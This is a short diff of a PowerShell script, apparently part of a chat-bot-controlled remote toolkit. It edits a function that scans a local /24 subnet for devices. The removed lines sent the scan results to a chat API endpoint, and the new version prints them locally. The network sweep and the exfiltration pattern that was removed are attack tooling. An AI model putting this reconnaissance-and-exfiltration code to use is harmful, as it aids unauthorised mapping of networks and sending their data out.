@@ -371,9 +371,6 @@ Remove-Item -Path $outpath -Force
 Function Enumerate-LAN{
 param ([string]$Prefix)
 if ($Prefix.Length -eq 0){Write-Output "Use -prefix to define the first 3 parts of an IP Address eg. Enumerate-LAN -prefix 192.168.1";sleep 1 ;return}
-$contents = "$glass Enumerating LAN Devices $glass Please wait.."
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 $FileOut = "$env:temp\Computers.csv"
 1..255 | ForEach-Object {
     $ipAddress = "$Prefix.$_"
@@ -404,9 +401,7 @@ $data | ForEach-Object {
 }
 $data | Export-Csv $FileOut -NoTypeInformation
 $results = Get-Content -Path $FileOut -Raw
-$contents = "$results"
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+Write-Output "$results"
 rm -Path $FileOut
 }
 
